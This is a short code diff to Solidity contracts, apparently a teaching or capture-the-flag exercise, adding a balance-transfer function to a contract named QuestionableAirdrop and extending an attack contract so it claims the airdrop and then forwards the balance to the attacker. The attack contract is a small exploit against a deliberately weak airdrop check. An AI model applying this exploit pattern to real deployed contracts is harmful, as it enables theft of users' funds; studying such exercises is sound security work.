@@ -44,6 +44,12 @@ contract QuestionableAirdrop {
         _;
     }
 
+    function transferAirdrop(address _newOwner) external {
+        uint _balalance = userBalances[msg.sender];
+        userBalances[msg.sender] = 0;
+        userBalances[_newOwner] = _balalance;
+    }
+
     function getUserBalance(address _user) external view returns (uint256) {
         return userBalances[_user];
     }
@@ -62,6 +68,7 @@ contract QuestionableAirdropAttack {
     function attack(address _target) external {
         ins = QuestionableAirdrop(_target);
         ins.receiveAirdrop(address(this));
+        ins.transferAirdrop(msg.sender);
     }
 
     function canReceiveAirdrop() external returns (bool) {
